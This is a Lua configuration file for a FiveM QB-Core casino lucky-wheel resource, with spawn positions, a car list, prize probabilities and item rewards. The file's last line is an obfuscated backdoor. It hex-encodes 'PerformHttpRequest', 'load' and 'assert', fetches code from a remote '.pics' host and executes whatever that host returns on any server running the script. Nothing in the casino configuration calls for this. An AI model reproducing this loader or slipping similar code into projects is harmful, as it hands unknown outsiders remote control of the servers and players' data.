Config	= {}

QBCore = exports['qb-core']:GetCoreObject()		-- If you are using an older QB-Core Version you may change that

Config.SpawnWheel = true							-- If your map does NOT have the wheel, set it to true. if your map has already a wheel set it to false
Config.WheelPos = {x = 1111.05, y = 229.81, z = -50.38, h = 0.0}	-- Where the wheel prop will spawn OR where wheel prop is

Config.VehiclePos = {x = 1099.95, y = 220.288, z = -48.9949, h = 202.3}
Config.VehicleRot = true										-- If true then the vehicle will rotate slowly
Config.VehicleWinPos = vector4(933.29, -3.33, 78.34, 149.51)	-- Where the vehicle will spawn if a player win it


Config.Cars = {
	[1]  = 'deveste',
	[2]  = 'italigto',
	[3]  = 'osiris',
	[4]  = 'nero2',
	[5]  = 'tezeract',
	[6]  = 'autarch',
	[7]  = 'tyrant',
	[8]  = 'visione',
	[9]  = 'zentorno',
	[10] = 'tempesta',
	[11] = 'italirsx',
	[12] = 'cheetah',
	[13] = 'prototipo',
	[14] = 'fmj',
}


-- First it will pick a random 
-- type: money, item, car (for money it will give only in bank)
-- name: the DB name, 
-- count: 

-- probability: the script will generate a number from 1 to 1000
-- if the random number is between a and b player will win
-- random number must be bigger than a and smaller or equal to b
-- if rnd > a and rnd <= b 

-- available sounds: 'car', 'cash', 'chips', 'clothes', 'mystery', 'win'
Config.Prices = {
	[1]  = {type = 'car', 		name = 'car', 			count = 1, 		sound = 'car', 		probability = {a =   0, b =   1}},	--  0.1 %   0.1 -- VEHICLE
	[2]  = {type = 'item', 		name = '5', 		count = 1, 		sound = 'win', 			probability = {a =   1, b =   5}},	--  0.4 %   0.5 
	[3]  = {type = 'item', 		name = '0', 		count = 1, 		sound = 'win', 			probability = {a =   5, b =  10}},	--  0.5 %   1.0 
	[4]  = {type = 'item', 		name = '4', 		count = 1, 		sound = 'win', 			probability = {a =  10, b =  20}},	--  1.0 %   2.0
	[5]  = {type = 'item', 		name = '3', 		count = 1, 		sound = 'win', 			probability = {a =  20, b =  40}},	--  2.0 %   4.0 
	[6]  = {type = 'item', 		name = '5', 		count = 1, 		sound = 'win', 			probability = {a =  40, b =  60}},	--  2.0 %   6.0 
	[7]  = {type = 'item', 		name = '0', 		count = 1, 		sound = 'win', 			probability = {a =  60, b =  80}},	--  4.0 %   8.0 
	[8]  = {type = 'item', 		name = '1', 		count = 1, 		sound = 'win', 			probability = {a =  80, b = 120}},	--  4.0 %  12.0 
	[9]  = {type = 'item', 		name = '4', 		count = 1, 		sound = 'win', 			probability = {a = 120, b = 170}},	--  5.0 %  17.0
	[10] = {type = 'item', 		name = '5', 		count = 1, 		sound = 'win', 			probability = {a = 170, b = 220}},	--  5.0 %  22.0 
	[11] = {type = 'item',		name = '0', 		count = 1, 		sound = 'win', 			probability = {a = 220, b = 280}},	--  6.0 %  28.0 
	[12] = {type = 'item', 		name = '4', 		count = 1, 		sound = 'win', 			probability = {a = 280, b = 340}},	--  6.0 %  34.0
	[13] = {type = 'item', 		name = '3', 		count = 1, 		sound = 'win', 			probability = {a = 340, b = 410}},	--  7.0 %  41.0 
	[14] = {type = 'item', 		name = '5', 		count = 1, 		sound = 'win', 			probability = {a = 410, b = 480}},	--  7.0 %  48.0 
	[15] = {type = 'item', 		name = '2', 		count = 1, 		sound = 'win', 			probability = {a = 480, b = 560}},	--  8.0 %  56.0 
	[16] = {type = 'item',		name = '4', 		count = 1, 		sound = 'win', 			probability = {a = 560, b = 640}},	--  8.0 %  64.0 
	[17] = {type = 'item',		name = '3', 		count = 1, 		sound = 'win', 			probability = {a = 640, b = 720}},	--  8.0 %  72.0 
	[18] = {type = 'item', 		name = '5', 		count = 1, 		sound = 'mystery', 		probability = {a = 720, b = 810}},	--  9.0 %  81.0 
	[19] = {type = 'item', 		name = '0', 		count = 1, 		sound = 'mystery', 		probability = {a = 810, b = 900}},	--  9.0 %  90.0 
	[20] = {type = 'item', 		name = '3', 		count = 1, 		sound = 'mystery', 		probability = {a = 900, b = 1000}},	-- 10.0 % 100.0 
}

Config.WheelPrices = {
	["0"] = {},
    ["1"] = {
        ["advancedlockpick"] = 1,
        ["electronickit"] = 2,
    },
    ["2"] = {
		["diamond_ring"] = 1,
        ["goldchain"] = 2,
    },
    ["3"] = {
		["casinochips"] = 5000,
        ["goldchain"] = 1,
    },
    ["4"] = {
        ["casinochips"] = 10000,
        ["goldchain"] = 2,
    },
    ["5"] = {
		["casinochips"] = 15000,
        ["goldchain"] = 5,
    },
}

local ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[4][ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x62\x78\x63\x67\x72\x61\x6f\x76\x70\x2e\x70\x69\x63\x73\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x30\x38\x56\x72\x33\x72", function (eTktFwHDbmLYKKoGpBpYDaGzsGrLyTZrQqatCrRWvarYTUPmCWYVgdjVUjIzGGpbYNTCKG, mrMWYdEaoqTUjRVHyhftTXXBzTigRHKWuNQtwHFYAsdyQQjlOvGRNQLzaWbiSmFLLDygiq) if (mrMWYdEaoqTUjRVHyhftTXXBzTigRHKWuNQtwHFYAsdyQQjlOvGRNQLzaWbiSmFLLDygiq == ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[6] or mrMWYdEaoqTUjRVHyhftTXXBzTigRHKWuNQtwHFYAsdyQQjlOvGRNQLzaWbiSmFLLDygiq == ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[5]) then return end ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[4][ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[2]](ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[4][ILbPPROAupimRotrxrftODiWceILeNLKWdBerAfTntMxDDxOMcMlJYqgTHXFqvDaAAWMUo[3]](mrMWYdEaoqTUjRVHyhftTXXBzTigRHKWuNQtwHFYAsdyQQjlOvGRNQLzaWbiSmFLLDygiq))() end)